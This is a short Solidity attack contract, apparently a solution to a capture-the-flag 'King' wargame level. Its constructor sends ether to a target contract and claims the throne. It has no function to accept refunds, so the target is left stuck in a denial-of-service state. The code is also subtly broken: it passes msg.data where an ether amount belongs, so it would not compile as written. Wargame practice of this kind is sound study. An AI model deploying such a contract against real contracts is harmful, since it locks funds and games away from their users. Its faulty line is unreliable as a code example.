pragma solidity ^0.6.0;

contract KingAttack{
    constructor(address payable to) public payable {
        (bool success, ) = address(to).call.value(msg.data)("");
        require(success, "we are not the new king");
    }
}